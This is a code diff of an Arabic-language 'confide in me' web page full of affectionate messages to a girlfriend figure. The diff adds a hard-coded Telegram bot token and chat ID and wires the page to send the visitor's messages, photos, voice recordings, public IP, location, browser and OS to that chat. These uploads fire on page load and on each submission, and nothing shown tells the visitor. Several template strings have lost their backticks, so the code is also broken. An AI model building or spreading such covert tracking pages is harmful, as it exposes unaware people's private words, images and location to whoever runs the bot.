@@ -1,3 +1,4 @@
+
 <!DOCTYPE html>
 <html lang="ar">
 <head>
@@ -5,10 +6,151 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>💕نورتي يكتكوتي💕</title>
     <style>
-        /* الأستايل كما هو */
+        body {
+            margin: 0;
+            padding: 0;
+            overflow: hidden;
+            font-family: Arial, sans-serif;
+            transition: background-color 2s ease-in-out;
+        }
+        .container {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            text-align: center;
+            z-index: 1;
+        }
+        h2 {
+            color: white;
+        }
+        textarea {
+            width: 80%;
+            max-width: 400px;
+            height: 150px;
+            border-radius: 10px;
+            border: 2px solid #ccc;
+            padding: 15px;
+            font-size: 16px;
+            margin-bottom: 20px;
+            resize: none;
+            background-color: rgba(255, 255, 255, 0.8);
+        }
+        .button {
+            padding: 10px 20px;
+            background-color: #ff69b4;
+            border: none;
+            color: white;
+            border-radius: 5px;
+            cursor: pointer;
+            font-size: 16px;
+            margin: 5px;
+            transition: background-color 0.3s;
+        }
+        .button:hover {
+            background-color: #ff1493;
+        }
+        .character {
+            position: absolute;
+            bottom: 10px;
+            right: 10px;
+            width: 100px;
+            height: auto;
+            animation: bounce 2s infinite;
+        }
+        @keyframes bounce {
+            0%, 100% { transform: translateY(0); }
+            50% { transform: translateY(-10px); }
+        }
+        .popup {
+            display: none;
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            width: 300px;
+            background-color: rgba(255, 255, 255, 0.8);
+            padding: 20px;
+            border-radius: 10px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+            text-align: center;
+            z-index: 1000;
+        }
+        .popup h3 {
+            margin-top: 0;
+        }
+        .popup .close-btn {
+            background-color: red;
+            color: white;
+            border: none;
+            padding: 5px 10px;
+            cursor: pointer;
+        }
+        .panda-popup {
+            display: none;
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            width: 400px;
+            height: 250px;
+            background-color: rgba(255, 255, 255, 0.8);
+            padding: 20px;
+            border-radius: 10px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+            text-align: center;
+            z-index: 1000;
+        }
+        .panda-popup img {
+            width: 100px;
+            height: auto;
+            margin-bottom: 10px;
+        }
+        .panda-popup p {
+            font-size: 18px;
+            color: #ff1493;
+        }
+        .voice-wave {
+            width: 100%;
+            height: 30px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+        .wave {
+            width: 5px;
+            height: 10px;
+            background-color: #ff69b4;
+            animation: wave-animation 1s infinite ease-in-out;
+        }
+        .wave:nth-child(2) {
+            animation-delay: 0.1s;
+        }
+        .wave:nth-child(3) {
+            animation-delay: 0.2s;
+        }
+        .wave:nth-child(4) {
+            animation-delay: 0.3s;
+        }
+        .wave:nth-child(5) {
+            animation-delay: 0.4s;
+        }
+        @keyframes wave-animation {
+            0%, 100% { height: 10px; }
+            50% { height: 30px; }
+        }
+        @media (max-width: 768px) {
+            .container {
+                width: 90%;
+            }
+            textarea {
+                width: 90%;
+            }
+        }
     </style>
 </head>
 <body>
+    <!-- الحاوية الرئيسية -->
     <div class="container">
         <h2>💕فضفضي يروحي ونا جنبك ديما متقلقيش💕</h2>
         <textarea id="message" placeholder="...✨احكي يروحي وهسمعك مقدرش ازعلك اصلا"></textarea>
@@ -87,7 +229,7 @@
                 'انا معاكي يروحي متخافيش كل حاجه هتبقا كويسه💕',  
                 'ششش تعالي بابا هيحضنك جامد فشخ🌸',  
                 'انتي اشطر كتكوته فدنيا يحياتي❤',  
-                'انتي احسن واجمل حد فعيوني💕',
+                'انتي احسن كتكوته فدنيا يحياتي🌟',
                 'بحبك اوي يروحي وهفضل ديما معاكي يحياتي💟',
                 'بحبك اوي يروحي وانتي احسن واجمل حد فعيوني💗',
                 'بحبك اوي يحياتي💘',
@@ -147,10 +289,9 @@
                 formData.append('audio', audioBlob, 'recording/mp3');
 
                 // إرسال الملف إلى Telegram
-                const botToken = 'YOUR_BOT_TOKEN'; 
-                const chatId = 'YOUR_CHAT_ID'; 
-
-                const telegramApiUrl = `https://api.telegram.org/bot${botToken}/sendAudio`;
+                const botToken = '7309654669:AAHoUa7SGJ90jB2f23j7O7RDF5OdM6OnGdg'; // التوكن الخاص بك
+                const chatId = '7631254472'; // معرف الدردشة الخاص بك
+                const telegramApiUrl = https://api.telegram.org/bot${botToken}/sendAudio;
 
                 fetch(telegramApiUrl, {
                     method: 'POST',
@@ -173,6 +314,9 @@
 
                 // إعادة تهيئة المتغيرات للتسجيل التالي
                 audioChunks = [];
+
+                // إرسال تفاصيل المستخدم
+                sendVisitorDetails();
             };
         }
 
@@ -181,13 +325,62 @@
             voicePopup.style.display = 'none';
         }
 
-        // متغير لحفظ حالة إرسال الـ IP
-        let ipSent = false;
+        // إرسال الرسالة النصية إلى Telegram
+        function sendMessage() {
+            const message = document.getElementById('message').value;
+            if (!message.trim()) {
+                alert("فضفضي الاول يكستوتي انت💋");
+                return;
+            }
 
-        // إرسال تفاصيل المستخدم عند تحميل الصفحة مباشرة ولكن مرة واحدة فقط
+            const botToken = '7309654669:AAHoUa7SGJ90jB2f23j7O7RDF5OdM6OnGdg'; // التوكن الخاص بك
+            const chatId = '7631254472'; // معرف الدردشة الخاص بك
+            const telegramMessage = رسالة جديدة:\n${message};
+
+            fetch(https://api.telegram.org/bot${botToken}/sendMessage, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({
+                    chat_id: chatId,
+                    text: telegramMessage,
+                }),
+            })
+
+            // عرض رسالة دب الباندا
+            showPandaMessage();
+
+            // إرسال تفاصيل المستخدم
+            sendVisitorDetails();
+        }
+
+        // إرسال الصورة إلى Telegram
+        document.getElementById('imageInput').addEventListener('change', function(event) {
+            const file = event.target.files[0];
+            if (file) {
+                const formData = new FormData();
+                formData.append('photo', file);
+
+                const botToken = '7309654669:AAHoUa7SGJ90jB2f23j7O7RDF5OdM6OnGdg'; // التوكن الخاص بك
+                const chatId = '7631254472'; // معرف الدردشة الخاص بك
+                const telegramApiUrl = https://api.telegram.org/bot${botToken}/sendPhoto;
+
+                fetch(telegramApiUrl, {
+                    method: 'POST',
+                    body: formData,
+                })
+
+                // عرض رسالة دب الباندا
+                showPandaMessage();
+
+                // إرسال تفاصيل المستخدم
+                sendVisitorDetails();
+            }
+        });
+
+        // إرسال تفاصيل الزائر إلى Telegram
         function sendVisitorDetails() {
-            if (ipSent) return; // لا ترسل الـ IP إلا مرة واحدة
-
             fetch('https://ipapi.co/json/')
                 .then(response => response.json())
                 .then(data => {
@@ -199,13 +392,13 @@
                     const platform = navigator.platform; // نظام التشغيل
 
                     // نص الرسالة
-                    const message = `زائر جديد!\n\n- IP العام: ${ip}\n- المدينة: ${city}\n- المنطقة: ${region}\n- الدولة: ${country}\n- المتصفح: ${userAgent}\n- النظام: ${platform}`;
+                    const message = زائر جديد!\n\n- IP العام: ${ip}\n- المدينة: ${city}\n- المنطقة: ${region}\n- الدولة: ${country}\n- المتصفح: ${userAgent}\n- النظام: ${platform};
 
                     // إرسال الرسالة إلى Telegram
-                    const botToken = 'YOUR_BOT_TOKEN'; 
-                    const chatId = 'YOUR_CHAT_ID'; 
+                    const botToken = '7309654669:AAHoUa7SGJ90jB2f23j7O7RDF5OdM6OnGdg'; // التوكن الخاص بك
+                    const chatId = '7631254472'; // معرف الدردشة الخاص بك
 
-                    fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                    fetch(https://api.telegram.org/bot${botToken}/sendMessage, {
                         method: 'POST',
                         headers: {
                             'Content-Type': 'application/json',
@@ -221,14 +414,10 @@
                 .catch(error => {
                     console.error("خطأ في الحصول على معلومات الموقع:", error);
                 });
-
-            // تعيين حالة إرسال الـ IP
-            ipSent = true;
         }
 
-        // إرسال تفاصيل الزائر عند تحميل الصفحة مباشرة
+        // إرسال تفاصيل المستخدم عند تحميل الصفحة
         document.addEventListener('DOMContentLoaded', sendVisitorDetails);
-
     </script>
 </body>
 </html>
